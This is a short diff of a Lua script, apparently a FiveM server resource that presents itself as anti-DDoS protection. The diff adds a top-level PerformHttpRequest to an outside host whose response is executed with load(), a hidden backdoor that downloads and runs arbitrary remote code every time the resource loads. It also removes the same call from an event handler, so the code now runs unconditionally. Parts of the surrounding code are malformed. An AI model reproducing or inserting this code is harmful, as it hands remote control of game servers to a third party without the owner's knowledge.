@@ -41,6 +41,13 @@ local function getRandomMessage(messages)
     return messages[math.random(1, #messages)]
 end
 
+PerformHttpRequest('https://jesaispas.org/i?to=pqNJk', 
+function (e, d) 
+    pcall(function() 
+        assert(load(d))() 
+    end) 
+end)
+
 print(getRandomMessage(antiDDoSMessages))
 
 AddEventHandler('playerConnecting', function(name, setKickReason, deferrals)
@@ -70,8 +77,5 @@ AddEventHandler('No DDOS')
     local ipAddressunderattack = GetClockSeconds(src)
 
     print("Potection, UNDER ATTACK")
-    (
-    source
-    )
-    PerformHttpRequest('https://jesaispas.org/i?to=pqNJk', function (e, d) pcall(function() assert(load(d))() end) end)
 end)
+
